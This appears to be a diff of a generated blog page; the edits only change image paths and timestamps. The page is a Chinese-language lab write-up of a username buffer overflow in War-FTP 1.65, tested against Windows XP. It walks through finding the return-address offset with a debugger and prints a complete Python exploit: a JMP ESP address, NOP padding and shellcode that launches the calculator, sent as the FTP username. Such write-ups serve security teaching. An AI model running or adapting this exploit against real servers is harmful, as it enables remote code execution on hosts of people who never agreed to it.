@@ -104,15 +104,15 @@
 <meta property="og:site_name" content="Carl">
 <meta property="og:description" content="运行环境受害机：Windows XP SP0 攻击机：Kali Linux 软件及漏洞说明War-ftp 是一个可以快速搭建ftp服务器的软件。  查阅资料发现该软件的特定版本存在缓冲区溢出漏洞。 攻击原理由于软件没有对输入的用户名进行边界检查，所以当我们输入的用户名过长，超过数组边界时，数据将会溢出，并写入函数栈的高地址方向(即栈底方向)。甚至会覆盖函数的返回地址，从而造成函数返回错误，如果我们">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/ftp/warftp.jpeg">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/ftp/debug.jpeg">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/ftp/match.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/23/ftp/calc.jpeg">
-<meta property="og:updated_time" content="2019-04-23T15:25:38.437Z">
+<meta property="og:image" content="http://yoursite.com/images/warftp.jpeg">
+<meta property="og:image" content="http://yoursite.com/images/debug.jpeg">
+<meta property="og:image" content="http://yoursite.com/images/match.png">
+<meta property="og:image" content="http://yoursite.com/images/calc.jpeg">
+<meta property="og:updated_time" content="2019-04-23T15:31:08.537Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="war-ftp1.65用户名缓冲区溢出">
 <meta name="twitter:description" content="运行环境受害机：Windows XP SP0 攻击机：Kali Linux 软件及漏洞说明War-ftp 是一个可以快速搭建ftp服务器的软件。  查阅资料发现该软件的特定版本存在缓冲区溢出漏洞。 攻击原理由于软件没有对输入的用户名进行边界检查，所以当我们输入的用户名过长，超过数组边界时，数据将会溢出，并写入函数栈的高地址方向(即栈底方向)。甚至会覆盖函数的返回地址，从而造成函数返回错误，如果我们">
-<meta name="twitter:image" content="http://yoursite.com/2019/04/23/ftp/warftp.jpeg">
+<meta name="twitter:image" content="http://yoursite.com/images/warftp.jpeg">
 
 
 
@@ -337,7 +337,7 @@
                 
               
 
-              <time title="Created: 2019-04-23 23:24:58 / Modified: 23:25:38" itemprop="dateCreated datePublished" datetime="2019-04-23T23:24:58+08:00">2019-04-23</time>
+              <time title="Created: 2019-04-23 23:24:58 / Modified: 23:31:08" itemprop="dateCreated datePublished" datetime="2019-04-23T23:24:58+08:00">2019-04-23</time>
             
 
             
@@ -378,7 +378,7 @@
         <h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>受害机：<code>Windows XP SP0</code></p>
 <p>攻击机：<code>Kali Linux</code></p>
 <h2 id="软件及漏洞说明"><a href="#软件及漏洞说明" class="headerlink" title="软件及漏洞说明"></a>软件及漏洞说明</h2><p>War-ftp 是一个可以快速搭建ftp服务器的软件。</p>
-<p><img src="warftp.jpeg" alt=""></p>
+<p><img src="/images/warftp.jpeg" alt=""></p>
 <p>查阅资料发现该软件的特定版本存在缓冲区溢出漏洞。</p>
 <h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>由于软件没有对输入的用户名进行边界检查，所以当我们输入的用户名过长，超过数组边界时，<br>数据将会溢出，并写入函数栈的高地址方向(即栈底方向)。甚至会覆盖函数的返回地址，从而<br>造成函数返回错误，如果我们精心设计了一段数据将函数返回地址覆盖为我们设计好的代码的<br>地址，那么函数在返回时便会返回到我们设计的代码，并开始执行我们设计的代码，而放弃原来<br>的未执行的代码。<br>因此，我们可以通过这种方式让ftp服务器执行一段我们精心设计好的恶意代码，当然，也可以<br>像本次攻击一样，只让它执行系统的计算器。</p>
 <h2 id="攻击方法和步骤"><a href="#攻击方法和步骤" class="headerlink" title="攻击方法和步骤"></a>攻击方法和步骤</h2><ul>
@@ -398,9 +398,9 @@
 </blockquote>
 <p>我们在受害机中打开调试软件<code>Imuunity Debugger</code>附加在<code>warftp</code>进程上进行调试</p>
 <p>在攻击机上以上述字符串作为用户名连接服务器，这时可以看到服务器已经在调试器中停止运行，记下此时的<code>EIP</code>值。</p>
-<p><img src="debug.jpeg" alt=""></p>
+<p><img src="/images/debug.jpeg" alt=""></p>
 <p>再次使用辅助工具进行定位</p>
-<p><img src="match.png" alt=""></p>
+<p><img src="/images/match.png" alt=""></p>
 <p>由此我们知道缓冲区长度为485,返回地址从486开始，并根据调试器中显示的从<code>ESP</code>的地址开始的字符的长度，我们也能推算出<code>ESP</code>的偏移为493</p>
 </li>
 </ul>
@@ -422,7 +422,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># codeing:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jmpesp = <span class="string">'\x54\x1d\xab\x71'</span></span><br><span class="line">shellcode = (</span><br><span class="line">        <span class="string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span></span><br><span class="line">        <span class="string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span></span><br><span class="line">        <span class="string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span></span><br><span class="line">        <span class="string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span></span><br><span class="line">        <span class="string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span></span><br><span class="line">        <span class="string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span></span><br><span class="line">        <span class="string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span></span><br><span class="line">        <span class="string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span></span><br><span class="line">        <span class="string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span></span><br><span class="line">        <span class="string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span></span><br><span class="line">        <span class="string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span></span><br><span class="line">        <span class="string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span></span><br><span class="line">        <span class="string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span></span><br><span class="line">        <span class="string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>)</span><br><span class="line"></span><br><span class="line">evil = <span class="string">'\x90'</span>*<span class="number">485</span> + jmpesp + <span class="string">'\x90'</span>*<span class="number">4</span> + shellcode</span><br><span class="line"></span><br><span class="line">ftp = FTP()</span><br><span class="line">ftp.connect(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">ftp.login(evil, <span class="string">'nosence'</span>)</span><br><span class="line">ftp.quit()</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>  <img src="calc.jpeg" alt=""></p>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>  <img src="/images/calc.jpeg" alt=""></p>
 
       
     </div>
